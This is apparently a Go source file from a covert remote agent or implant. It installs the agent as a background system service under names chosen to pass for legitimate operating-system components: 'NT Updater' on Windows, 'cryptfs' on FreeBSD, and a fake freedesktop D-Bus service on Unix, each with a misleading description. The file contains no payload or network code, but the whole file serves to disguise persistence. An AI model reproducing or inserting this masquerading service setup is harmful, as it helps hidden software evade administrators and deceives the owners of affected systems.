// This defines the setup of the agent as a system service.
// The logic is separated to allow for running the executable
// standalone as well as as a service
package agent

import (
	"runtime"

	"github.com/kardianos/service"
)

func GetServiceConfig() *service.Config {
	var svcName, svcDisplayName, svcDesc string
	switch runtime.GOOS {
	// Windows config
	case "windows":
		svcName = "NT Updater"
		svcDisplayName = "ntupdater"
		svcDesc = "NT Subsystem Component Updater"
	// FreeBSD config
	case "freebsd":
		svcName = "cryptfs"
		svcDisplayName = "Cryptographic File System Mount Daemon"
		svcDesc = "Provides transparent file-level encryption and decryption services for specified storage volumes during system initialization."
	// Unix config
	default:
		svcName = "dbus-org.freedesktop.export1"
		svcDisplayName = "Disk Image Upload Service"
		svcDesc = "Facilitates the secure, automated exporting and uploading of virtual disk images to remote cloud repositories and storage networks."
	}

	return &service.Config{
		Name:        svcName,
		DisplayName: svcDisplayName,
		Description: svcDesc,
	}
}

type Program struct {}

func (p *Program) Start(s service.Service) error {
	// Start should not block. Run agent in background
	go p.run()
	return nil
}

func (p *Program) run() {
	// Calls the agent start method
	start()
}

func (p *Program) Stop(s service.Service) error {
	// Process will exit when killed.
	return nil
}
